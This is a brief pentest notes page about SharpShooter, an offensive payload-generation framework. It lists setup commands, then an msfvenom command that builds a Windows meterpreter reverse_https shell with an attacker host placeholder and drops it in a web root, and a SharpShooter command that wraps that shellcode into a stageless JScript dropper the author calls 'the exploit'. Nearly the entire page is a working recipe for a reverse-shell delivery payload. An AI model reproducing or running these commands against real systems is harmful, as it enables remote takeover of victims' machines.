---
layout:     post
author:     0x5c4r3
type: docs
permalink: SharpShooter
---


<span style="font-size: 35px; color:red"><b>SharpShooter</b></span>
&nbsp;

https://github.com/mdsecactivebreach/SharpShooter.git

In order to make it work:
```shell
apt-get install virtualenv python3-autopep8 python2-setuptools-whl python2-setuptools-whl
cd /opt/; git clone https://github.com/mdsecactivebreach/SharpShooter.git
cd SharpShooter; pip install -r requirements.txt
autopep8 -i /opt/SharpShooter/modules/excel4.py
virtualenv sharpshooter-venv -p $(which python2)
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python get-pip.py
pip install -r requirements.txt
```

Create a revshell payload:
```shell
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=443 -f raw -o /var/www/html/shell.txt
```

Create the .js file with the following command:
```shell
sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
```

It will create a test.js which is the exploit.
